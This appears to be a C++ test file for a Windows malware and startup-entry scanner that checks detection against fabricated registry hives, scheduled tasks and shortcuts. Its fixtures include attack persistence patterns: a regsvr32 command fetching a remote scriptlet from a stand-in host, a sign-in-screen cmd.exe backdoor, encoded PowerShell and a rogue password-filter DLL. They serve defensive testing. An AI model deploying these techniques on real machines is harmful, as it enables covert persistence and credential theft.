// SPDX-FileCopyrightText: 2026 Danny S
// SPDX-License-Identifier: GPL-3.0-or-later

// Scan for Viruses' second layer, what starts with Windows: a Windows folder tree made from
// the test hives (tests/data/registry), tasks written the way Windows writes them, and
// shortcuts Windows made, with what malware would add.
//
// DISKANVIL_REAL_WINDOWS=<folder>: also a real Windows drive, mounted there (read-only).

#include "testkit.h"

#include "../src/viruses/activity.h"
#include "../src/viruses/shelllink.h"
#include "../src/viruses/winstartup.h"

#include <QDir>
#include <QElapsedTimer>
#include <QFile>
#include <QRandomGenerator>
#include <QStringDecoder>
#include <QTemporaryDir>

namespace {

const QString kData = QStringLiteral(SOURCE_DIR "/tests/data/registry/");

QByteArray readAll(const QString &path)
{
    QFile f(path);
    return f.open(QIODevice::ReadOnly) ? f.readAll() : QByteArray();
}

void put(const QString &path, const QByteArray &data)
{
    QDir().mkpath(QFileInfo(path).absolutePath());
    QFile f(path);
    if (f.open(QIODevice::WriteOnly))
        f.write(data);
}

// A task the way Task Scheduler stores one: UTF-16 with a byte order mark.
QByteArray task(const QString &command, const QString &arguments, bool enabled = true)
{
    const QString xml = QStringLiteral(
                            "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n"
                            "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n"
                            "  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>\r\n"
                            "  <Settings><Enabled>%3</Enabled><Hidden>true</Hidden></Settings>\r\n"
                            "  <Actions Context=\"Author\"><Exec><Command>%1</Command><Arguments>%2</Arguments></Exec></Actions>\r\n"
                            "</Task>\r\n")
                            .arg(command.toHtmlEscaped(), arguments.toHtmlEscaped(), enabled ? QStringLiteral("true") : QStringLiteral("false"));
    QByteArray out("\xff\xfe", 2);
    for (QChar c : xml) {
        out += char(c.unicode() & 0xff);
        out += char(c.unicode() >> 8);
    }
    return out;
}

void shortcuts()
{
    shelllink::Link link;
    const bool helper = shelllink::parse(readAll(kData + QStringLiteral("helper.lnk")), &link);
    report(helper && link.target == QLatin1String("C:\\Windows\\System32\\wscript.exe")
               && link.arguments == QLatin1String("//B \"C:\\Users\\tester\\AppData\\Local\\Temp\\x9\\run.vbs\""),
           QStringLiteral("startup: a shortcut Windows made, with arguments"), link.target + QLatin1Char(' ') + link.arguments);
    const bool notes = shelllink::parse(readAll(kData + QStringLiteral("notes.lnk")), &link);
    report(notes && link.target == QLatin1String("%windir%\\notepad.exe"), QStringLiteral("startup: a shortcut kept with %windir% in it"), link.target);
    QByteArray cut = readAll(kData + QStringLiteral("helper.lnk"));
    bool survived = true;
    for (qsizetype n = 0; n < cut.size(); n += 7)
        survived = survived && (shelllink::parse(cut.left(n), &link) || true);
    report(survived && !shelllink::parse("not a shortcut at all, but long enough to have a header in it, more or less: 76 bytes", &link),
           QStringLiteral("startup: cut-off shortcuts and other files"));
    // Damaged ones: never a crash (ASan runs this too).
    QRandomGenerator rng(1010);
    const QByteArray clean = readAll(kData + QStringLiteral("notes.lnk"));
    const int rounds = qEnvironmentVariableIntValue("DISKANVIL_FUZZ_ROUNDS") > 0 ? qEnvironmentVariableIntValue("DISKANVIL_FUZZ_ROUNDS") : 500;
    for (int round = 0; round < rounds; ++round) {
        QByteArray bytes = clean;
        for (int i = 0, flips = 1 + int(rng.bounded(12)); i < flips; ++i)
            bytes[qsizetype(rng.bounded(quint32(bytes.size())))] = char(rng.bounded(256));
        shelllink::parse(bytes, &link);
    }
    report(true, QStringLiteral("startup: %1 damaged shortcuts read without a crash").arg(rounds));
}

// The Windows drive: the hives, and the files the entries point at (or not).
QString makeWindows(const QString &dir)
{
    const QString root = dir + QStringLiteral("/drive");
    put(root + QStringLiteral("/Windows/System32/config/SOFTWARE"), readAll(kData + QStringLiteral("software.hiv")));
    put(root + QStringLiteral("/Windows/System32/config/SYSTEM"), readAll(kData + QStringLiteral("system.hiv")));
    // The case Windows' drive keeps isn't always the one the registry uses.
    put(root + QStringLiteral("/Users/tester/NTUSER.DAT"), readAll(kData + QStringLiteral("ntuser.hiv")));
    for (const char *file : {"Windows/System32/SecurityHealthSystray.exe", "Users/tester/AppData/Local/Temp/xkqzvbnw.exe",
                             "Program Files (x86)/Old App/old.exe", "ProgramData/svc/host.exe", "Windows/System32/cmd.exe",
                             "Users/Public/svc.exe", "Windows/System32/goodsvc.dll", "Windows/System32/drivers/drv.sys",
                             "Users/tester/AppData/Local/Discord/Update.exe", "Users/tester/AppData/Roaming/abc.exe", "Windows/System32/mshta.exe",
                             "Windows/System32/WindowsPowerShell/v1.0/powershell.exe", "Windows/explorer.exe", "Windows/notepad.exe",
                             "Windows/System32/userinit.exe", "Windows/System32/wscript.exe", "Windows/System32/defrag.exe",
                             "Users/tester/AppData/Roaming/upd/a3f9c2e10b.exe"})
        put(root + QLatin1Char('/') + QLatin1String(file), "MZ");
    const QString tasks = root + QStringLiteral("/Windows/System32/Tasks/");
    put(tasks + QStringLiteral("Microsoft/Windows/Defrag/ScheduledDefrag"), task(QStringLiteral("%windir%\\system32\\defrag.exe"), QStringLiteral("-c -h -o -$")));
    put(tasks + QStringLiteral("OneDrive Updater"), task(QStringLiteral("C:\\Users\\tester\\AppData\\Roaming\\upd\\a3f9c2e10b.exe"), QStringLiteral("/silent")));
    put(tasks + QStringLiteral("Old Thing"), task(QStringLiteral("C:\\x\\old.exe"), QString(), false));
    put(root + QStringLiteral("/Users/tester/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/helper.lnk"),
        readAll(kData + QStringLiteral("helper.lnk")));
    put(root + QStringLiteral("/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/notes.lnk"), readAll(kData + QStringLiteral("notes.lnk")));
    put(root + QStringLiteral("/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/desktop.ini"), "[.ShellClassInfo]");
    return root;
}

const startup::Entry *entry(const startup::Report &r, const QString &name)
{
    for (const startup::Entry &e : r.entries) {
        if (e.name == name)
            return &e;
    }
    return nullptr;
}

QString describe(const startup::Entry *e)
{
    if (!e)
        return QStringLiteral("(missing)");
    return QStringLiteral("%1 -> %2 [%3] %4").arg(e->name, e->program).arg(e->severity).arg(e->reasons.join(QStringLiteral(" / ")).left(100));
}

void offline(const QString &dir)
{
    const QString root = makeWindows(dir);
    report(startup::hasWindows(root) && !startup::hasWindows(dir), QStringLiteral("startup: a drive with Windows on it is recognised"));
    QElapsedTimer t;
    t.start();
    const startup::Report r = startup::find(root);
    report(r.windows && r.notes.isEmpty(), QStringLiteral("startup: read in %1 ms").arg(t.elapsed()), r.notes.join(QStringLiteral("; ")));

    struct Expect {
        const char *name;
        int severity;
        const char *program; // ends with
        const char *reason;  // a word of one reason
    };
    const QVector<Expect> expected = {
        {"SecurityHealth", 0, "\\system32\\SecurityHealthSystray.exe", ""},
        {"Updater", 2, "\\Temp\\xkqzvbnw.exe", "temporary"},
        {"Helper", 2, "\\WindowsPowerShell\\v1.0\\powershell.exe", "encoded"},
        {"Gone", 1, "\\Gone App\\gone.exe", "isn't there"},
        {"Cleanup", 0, "\\System32\\cmd.exe", ""},
        {"OldApp", 0, "\\Old App\\old.exe", ""},
        {"Shell", 2, "C:\\ProgramData\\svc\\host.exe", "desktop"},
        {"Userinit", 0, "\\system32\\userinit.exe", ""},
        {"sethc.exe", 2, "\\System32\\cmd.exe", "sign-in screen"},
        {"Windows Update Helper", 2, "C:\\Users\\Public\\svc.exe", "named like a part of Windows"},
        {"GoodSvc", 0, "\\System32\\goodsvc.dll", ""},
        {"Drv", 0, "\\System32\\drivers\\drv.sys", ""},
        {"BootExecute", 1, "\\System32\\evil.exe", "disk check"},
        {"Notification Packages", 1, "\\System32\\evilfilter.dll", "passwords"},
        {"Discord", 0, "\\Discord\\Update.exe", ""},
        {"Zz", 2, "\\System32\\mshta.exe", "internet"},
        {"Load", 1, "\\Roaming\\abc.exe", "old way"},
        {"ScheduledDefrag", 0, "\\system32\\defrag.exe", ""},
        {"OneDrive Updater", 2, "\\upd\\a3f9c2e10b.exe", "random"},
        {"helper.lnk", 2, "\\System32\\wscript.exe", "temporary"},
        {"notes.lnk", 0, "\\notepad.exe", ""},
    };
    for (const Expect &x : expected) {
        const startup::Entry *e = entry(r, QLatin1String(x.name));
        const bool ok = e && e->severity == x.severity && e->program.endsWith(QLatin1String(x.program), Qt::CaseInsensitive)
                     && (QByteArray(x.reason).isEmpty() ? e->reasons.isEmpty() : e->reasons.join(QLatin1Char(' ')).contains(QLatin1String(x.reason)));
        report(ok, QStringLiteral("startup: %1").arg(QLatin1String(x.name)), describe(e));
    }
    const startup::Entry *off = entry(r, QStringLiteral("Off"));
    const startup::Entry *disabled = entry(r, QStringLiteral("Old Thing"));
    const startup::Entry *ini = entry(r, QStringLiteral("desktop.ini"));
    report(!off && !disabled && !ini, QStringLiteral("startup: a switched-off service and task, and desktop.ini, aren't listed"));
    const startup::Entry *updater = entry(r, QStringLiteral("Updater"));
    report(updater && updater->file == root + QStringLiteral("/Users/tester/AppData/Local/Temp/xkqzvbnw.exe") && updater->user.isEmpty()
               && updater->hiveFile.endsWith(QLatin1String("/config/SOFTWARE")) && updater->key == QLatin1String("Microsoft\\Windows\\CurrentVersion\\Run"),
           QStringLiteral("startup: an entry says where its file is here, and where it's kept"), updater ? updater->file : QString());
    const startup::Entry *zz = entry(r, QStringLiteral("Zz"));
    report(zz && zz->user == QLatin1String("tester") && zz->hiveFile.endsWith(QLatin1String("/Users/tester/NTUSER.DAT")),
           QStringLiteral("startup: a user's own entries are theirs"), zz ? zz->where : QString());
}

void commands()
{
    const QHash<QString, QString> env = {{QStringLiteral("systemroot"), QStringLiteral("C:\\Windows")},
                                         {QStringLiteral("programfiles"), QStringLiteral("C:\\Program Files")}};
    const QSet<QString> files = {QStringLiteral("c:\\program files\\my app\\app.exe"), QStringLiteral("c:\\windows\\system32\\shell32.dll"),
                                 QStringLiteral("c:\\windows\\system32\\rundll32.exe")};
    auto exists = [&files](const QString &path) { return files.contains(path.toLower()); };
    struct Case {
        const char *command;
        const char *program;
    };
    const QVector<Case> cases = {
        {"C:\\Program Files\\My App\\app.exe /tray", "C:\\Program Files\\My App\\app.exe"},
        {"%ProgramFiles%\\My App\\app /tray", "C:\\Program Files\\My App\\app.exe"},
        {"\"C:\\Program Files\\Other\\x.exe\" -a", "C:\\Program Files\\Other\\x.exe"},
        {"rundll32.exe shell32.dll,Control_RunDLL", "C:\\Windows\\System32\\shell32.dll"},
        {"%windir%\\system32\\rundll32.exe /d acproxy.dll,PerformAutochkOperations", "C:\\Windows\\System32\\acproxy.dll"},
        {"rundll32 \"C:\\Users\\a\\AppData\\x y.dll\",Start", "C:\\Users\\a\\AppData\\x y.dll"},
        {"regsvr32 /s /n /i:http://x.invalid/a.sct scrobj.dll", "C:\\Windows\\System32\\scrobj.dll"},
        {"\\??\\C:\\Windows\\System32\\drivers\\a.sys", "C:\\Windows\\System32\\drivers\\a.sys"},
        {"System32\\drivers\\b.sys", "C:\\Windows\\System32\\drivers\\b.sys"},
        {"C:\\Windows\\system32\\userinit.exe,", "C:\\Windows\\system32\\userinit.exe"},
    };
    for (const Case &c : cases) {
        const QString program = startup::programOf(QLatin1String(c.command), env, exists);
        report(program == QLatin1String(c.program), QStringLiteral("startup: the program in %1").arg(QLatin1String(c.command)), program);
    }
}

// What This PC Did: hives with our own values where Windows keeps what it was used for
// (activity.ps1), and a shortcut in the Recent folder.
void activityRecords(const QString &dir)
{
    const QString root = dir + QStringLiteral("/used");
    put(root + QStringLiteral("/Windows/System32/config/SOFTWARE"), readAll(kData + QStringLiteral("activity-software.hiv")));
    put(root + QStringLiteral("/Windows/System32/config/SYSTEM"), readAll(kData + QStringLiteral("activity-system.hiv")));
    put(root + QStringLiteral("/Users/tester/NTUSER.DAT"), readAll(kData + QStringLiteral("activity-ntuser.hiv")));
    const QString recent = root + QStringLiteral("/Users/tester/AppData/Roaming/Microsoft/Windows/Recent/notes.lnk");
    put(recent, readAll(kData + QStringLiteral("notes.lnk")));
    const QDateTime opened(QDate(2024, 6, 9), QTime(12, 0), QTimeZone::UTC);
    {
        QFile f(recent);
        if (f.open(QIODevice::ReadWrite))
            f.setFileTime(opened, QFileDevice::FileModificationTime);
    }
    const activity::Report r = activity::read(root);
    const activity::Overview &o = r.overview;
    report(r.windows && o.product == QLatin1String("Windows 11 Pro") && o.release == QLatin1String("23H2") && o.build == QLatin1String("22631")
               && o.computerName == QLatin1String("ANVIL-PC") && o.owner == QLatin1String("Sam Tester") && o.organisation == QLatin1String("Anvil Test")
               && o.installed == QDateTime::fromSecsSinceEpoch(1704100000, QTimeZone::UTC)
               && o.lastShutdown == QDateTime(QDate(2024, 6, 10), QTime(22, 15), QTimeZone::UTC) && o.timeZone == QLatin1String("GMT Standard Time"),
           QStringLiteral("activity: what the PC is (Windows 11 told from 10 by its build), its name, owner, install and last shutdown"),
           QStringLiteral("%1 %2 %3 %4 %5").arg(o.product, o.release, o.computerName, o.installed.toString(Qt::ISODate), o.lastShutdown.toString(Qt::ISODate)));
    const auto find = [&r](const QString &what) -> const activity::Event * {
        for (const activity::Event &e : r.events) {
            if (e.what == what)
                return &e;
        }
        return nullptr;
    };
    const activity::Event *stick = find(QStringLiteral("USB drive: SanDisk Cruzer Blade USB Device"));
    const activity::Event *generic = find(QStringLiteral("USB drive: Generic Flash Disk"));
    report(stick && stick->when == QDateTime(QDate(2024, 6, 9), QTime(17, 45), QTimeZone::UTC) && stick->detail.contains(QLatin1String("4C530001230508116054"))
               && stick->detail.contains(QLatin1String("first plugged in")) && generic
               && generic->when == QDateTime(QDate(2023, 11, 5), QTime(12, 0), QTimeZone::UTC) && !generic->detail.contains(QLatin1String("serial")),
           QStringLiteral("activity: USB drives, with their serial (not one Windows made up) and when they were plugged in, both ways Windows keeps it"),
           stick ? stick->detail : QStringLiteral("no stick"));
    const activity::Event *cleaner = find(QStringLiteral("Ran cleaner.exe"));
    const activity::Event *notepad = find(QStringLiteral("Ran notepad++.exe"));
    bool session = false;
    for (const activity::Event &e : r.events)
        session = session || e.what.contains(QLatin1String("UEME"));
    report(cleaner && cleaner->when == QDateTime(QDate(2024, 6, 8), QTime(21, 0), QTimeZone::UTC) && cleaner->detail.contains(QLatin1String("5 time"))
               && cleaner->user == QLatin1String("tester") && notepad && notepad->detail.startsWith(QLatin1String("C:\\Program Files\\Notepad++\\notepad++.exe"))
               && notepad->detail.contains(QLatin1String("12 time")) && !session,
           QStringLiteral("activity: programs run, how often and when last (UserAssist, its folder IDs turned into folders)"),
           notepad ? notepad->detail : QStringLiteral("no notepad++"));
    int statements = 0;
    for (const activity::Event &e : r.events)
        statements += e.what == QLatin1String("Opened bank statement.pdf");
    const activity::Event *link = find(QStringLiteral("Opened notes"));
    report(statements == 1 && find(QStringLiteral("Searched for \"tax return\"")) && find(QStringLiteral("Went to \\\\nas\\photos"))
               && find(QStringLiteral("Typed in the Run box: cmd")) && link && link->detail.contains(QLatin1String("notepad.exe")) && link->when == opened,
           QStringLiteral("activity: files opened (once each), searches, folders and commands typed, a shortcut's target and time"),
           link ? link->detail + QLatin1Char(' ') + link->when.toString(Qt::ISODate) : QStringLiteral("no shortcut"));
    const activity::Event *cafe = find(QStringLiteral("Joined the network \"Cafe Wifi\""));
    report(cafe && cafe->when == QDateTime(QDate(2024, 6, 2), QTime(18, 30), QTimeZone::UTC) && cafe->detail.contains(QLatin1String("first joined"))
               && find(QStringLiteral("Account: tester")),
           QStringLiteral("activity: networks joined, and the accounts"));
    bool newestFirst = true;
    for (qsizetype i = 1; i < r.events.size(); ++i) {
        if (r.events[i].when.isValid() && (!r.events[i - 1].when.isValid() || r.events[i].when > r.events[i - 1].when))
            newestFirst = false;
    }
    report(newestFirst && r.events.first().when == QDateTime(QDate(2024, 6, 9), QTime(17, 45), QTimeZone::UTC),
           QStringLiteral("activity: newest first, the ones without a time last"));
    const QString html = activity::html(r, r.events, QStringLiteral("ANVIL-PC"));
    const QByteArray csv = activity::csv(r.events);
    report(html.contains(QLatin1String("Cafe Wifi")) && html.contains(QLatin1String("Windows 11 Pro")) && csv.contains("cleaner.exe")
               && csv.count('\n') == r.events.size() + 1,
           QStringLiteral("activity: saved as a web page and CSV"));
    // Small pieces, and nonsense in them.
    report(activity::rot13(QStringLiteral("Pyrnare.rkr")) == QLatin1String("Cleaner.exe") && activity::tidyUsbName(QStringLiteral("Disk&Ven_&Prod_X&Rev_1")) == QLatin1String("X")
               && !activity::fromSystemTime(QByteArray(16, '\xff')).isValid() && !activity::fromSystemTime(QByteArray(3, '\0')).isValid()
               && !activity::fromFileTime(1).isValid(),
           QStringLiteral("activity: ROT13, USB names, and times that are nonsense left out"));
    QRandomGenerator rng(99);
    const QByteArray user = readAll(kData + QStringLiteral("activity-ntuser.hiv"));
    for (int round = 0; round < 60; ++round) {
        QByteArray bad = user;
        for (int i = 0; i < 40; ++i)
            bad[qsizetype(rng.bounded(quint32(bad.size())))] = char(rng.bounded(256));
        put(root + QStringLiteral("/Users/tester/NTUSER.DAT"), bad);
        activity::read(root);
    }
    report(true, QStringLiteral("activity: 60 damaged hives read without a crash"));
}

void realWindows()
{
    const QString root = qEnvironmentVariable("DISKANVIL_REAL_WINDOWS");
    if (root.isEmpty()) {
        out << "SKIP  startup: no real Windows drive (DISKANVIL_REAL_WINDOWS)" << Qt::endl;
        return;
    }
    QElapsedTimer t;
    t.start();
    const startup::Report r = startup::find(root);
    int odd = 0;
    for (const startup::Entry &e : r.entries) {
        if (e.severity > 0) {
            ++odd;
            out << "      " << e.severity << ' ' << e.where << ": " << e.name << " = " << e.command.left(120) << Qt::endl
                << "        " << e.reasons.join(QStringLiteral(" / ")).left(200) << Qt::endl;
        }
    }
    report(r.windows && r.entries.size() > 50, QStringLiteral("startup: a real Windows, in %1 ms").arg(t.elapsed()),
           QStringLiteral("%1 entries, %2 look odd; %3").arg(r.entries.size()).arg(odd).arg(r.notes.join(QStringLiteral("; "))));
    t.restart();
    const activity::Report a = activity::read(root);
    QHash<int, int> kinds;
    for (const activity::Event &e : a.events)
        ++kinds[int(e.kind)];
    for (int i = 0; i < std::min<qsizetype>(12, a.events.size()); ++i)
        out << "      " << a.events[i].when.toString(Qt::ISODate) << ' ' << a.events[i].what << " | " << a.events[i].detail.left(100) << Qt::endl;
    report(a.windows && a.overview.found() && !a.events.isEmpty(), QStringLiteral("activity: a real Windows, in %1 ms").arg(t.elapsed()),
           QStringLiteral("%1 %2 %3, %4 events: %5 USB, %6 programs, %7 files, %8 networks")
               .arg(a.overview.product, a.overview.release, a.overview.computerName)
               .arg(a.events.size())
               .arg(kinds.value(int(activity::Kind::UsbDevice)))
               .arg(kinds.value(int(activity::Kind::ProgramRun)))
               .arg(kinds.value(int(activity::Kind::FileOpened)))
               .arg(kinds.value(int(activity::Kind::Network))));
}

} // namespace

void startupTests()
{
    QTemporaryDir dir;
    shortcuts();
    commands();
    offline(dir.path());
    activityRecords(dir.path());
    realWindows();
}
